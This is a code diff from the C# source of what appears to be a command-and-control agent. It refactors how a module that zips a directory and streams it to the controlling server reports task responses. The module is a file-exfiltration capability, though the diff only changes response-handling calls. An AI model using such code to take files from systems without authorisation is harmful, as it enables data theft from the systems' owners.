@@ -74,7 +74,7 @@ namespace Agent
 
             if (!dirInfo.Exists)
             {
-                await messageManager.AddResponse(new TaskResponse()
+                messageManager.AddTaskResponse(new TaskResponse()
                 {
                     task_id = job.task.id,
                     user_output = "Directory doesn't exist.",
@@ -88,7 +88,7 @@ namespace Agent
             if (args.write)
             {
                 ZipFile.CreateFromDirectory(args.source, args.destination, CompressionLevel.SmallestSize, false);
-                //await messageManager.AddResponse(new TaskResponse()
+                //messageManager.AddTaskResponse(new TaskResponse()
                 //{
                 //    task_id = job.task.id,
                 //    user_output = $"Zip written to {args.destination}.",
@@ -103,7 +103,7 @@ namespace Agent
             {
                 if (directorySize > 1073741824 && !args.force)
                 {
-                    await messageManager.AddResponse(new TaskResponse()
+                    messageManager.AddTaskResponse(new TaskResponse()
                     {
                         task_id = job.task.id,
                         user_output = $"This zip is gonna be pretty big, the folder is ({directorySize}) bytes, consider specifying write=true to flush to disk first, or specify force=true to specify force it to be in memory",
@@ -127,7 +127,7 @@ namespace Agent
             downloadJobs.GetOrAdd(job.task.id, job);
 
 
-            await messageManager.AddResponse(new DownloadTaskResponse
+            messageManager.AddTaskResponse(new DownloadTaskResponse
             {
                 user_output = string.Empty,
                 download = new DownloadTaskResponseData()
@@ -156,7 +156,7 @@ namespace Agent
                 {
                     message = "An error occurred while communicating with the server.";
                 }
-                await this.messageManager.WriteLine(message, response.task_id, true, "error");
+                this.messageManager.WriteLine(message, response.task_id, true, "error");
                 this.CompleteDownloadJob(response.task_id);
                 return;
             }
@@ -204,7 +204,7 @@ namespace Agent
             }
 
             //return our message
-            await messageManager.AddResponse(dr.ToJson());
+            messageManager.AddTaskResponse(dr.ToJson());
 
             if (dr.completed)
             {
